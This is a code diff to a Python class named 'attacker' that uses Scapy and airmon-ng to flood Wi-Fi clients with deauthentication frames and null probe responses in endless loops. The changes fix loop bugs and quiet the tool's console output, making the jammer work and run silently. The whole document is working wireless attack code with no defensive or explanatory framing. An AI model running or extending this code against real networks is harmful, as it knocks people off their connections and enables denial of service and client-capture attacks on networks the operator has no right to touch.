@@ -59,7 +59,7 @@ class attacker:
 
             self.attack_int = self.__start_monitor_mode(self.attack_int)
             while True:
-                for i in len(args):
+                for i in range(len(args)):
                     # if args[i]["Freq"] == '2.4':  # 2.4 GHz
                     #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
@@ -68,8 +68,7 @@ class attacker:
                     quantity = 10
                     sendp(deauth_frame, iface=self.attack_int, count=quantity, verbose=0)
         else:
-            print(f"Sending only {frames_quantity} deauth frames")
-            for i in len(args):
+            for i in range(len(args)):
                 # if args[i]["Freq"] == '2.4':  # 2.4 GHz
                 #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                 self.__change_channel(self.attack_int, int(args[i]["Channel"]))
@@ -77,8 +76,7 @@ class attacker:
                                                   addr3=args[i]["BSSID"]) / Dot11Deauth(reason=7)
                 sendp(deauth_frame, iface=self.attack_int, count=frames_quantity, verbose=0)
 
-    def deauth(self, args: dict, frames_quantity=1):
-        print(f"Sending only {frames_quantity} deauth frames")
+    def __deauth(self, args: dict, frames_quantity=1):
         deauth_frame = RadioTap() / Dot11(type=0, subtype=12, addr1=args["MAC"], addr2=args["BSSID"],
                                           addr3=args["BSSID"]) / Dot11Deauth(reason=7)
         sendp(deauth_frame, iface=self.attack_int, count=frames_quantity, verbose=0)
@@ -86,11 +84,11 @@ class attacker:
     def null_probe_response(self, args: list[dict]):
         self.attack_int = self.__start_monitor_mode(self.attack_int)
         while True:
-            for i in len(args):
+            for i in range(len(args)):
                 # if args[i]["Freq"] == '2.4':  # 2.4 GHz
                 #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
                 self.__change_channel(self.attack_int, int(args[i]["Channel"]))
-                self.deauth(args[i], 5)
+                self.__deauth(args[i], 5)
 
                 null_probe_resp_frame = RadioTap() / Dot11(addr1=args[i]["MAC"], addr2=args[i]["BSSID"], addr3=args[i]["BSSID"]) \
                                          / Dot11ProbeResp(cap="ESS") \
@@ -116,8 +114,8 @@ class attacker:
         return retval
 
     def __start_monitor_mode(self, interface):  # возвращает имя интерфейса после его перевода в режим монитора
-        bash(f"airmon-ng check kill")
-        bash(f"airmon-ng start {interface}")
+        bash(f"airmon-ng check kill > /dev/null")
+        bash(f"airmon-ng start {interface} > /dev/null")
         for i in self.__GetInterfaces():
             if interface in i:
                 self.interface = i
